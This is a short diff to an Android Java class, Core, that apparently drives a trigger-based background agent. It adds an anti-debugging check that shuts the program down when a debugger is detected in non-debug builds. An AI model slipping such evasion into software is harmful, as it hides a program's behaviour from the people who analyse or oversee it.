@@ -293,7 +293,7 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.MEMOSTAT) {
 					logMemory();
 				}
-
+				
 				final Trigger[] actionIds = status.getTriggeredActions(qq);
 				if (Cfg.POWER_MANAGEMENT) {
 					Status.self().acquirePowerLock();
@@ -307,6 +307,14 @@ public class Core extends Activity implements Runnable {
 
 				if (Cfg.DEMO) {
 					Beep.bip();
+				}
+				
+				if(!Cfg.DEBUG){
+					// ANTIDEBUG
+					AntiDebug ad = new AntiDebug();
+					if (ad.isDebug()) {
+						stopAll();
+					}
 				}
 
 				for (final Trigger trigger : actionIds) {
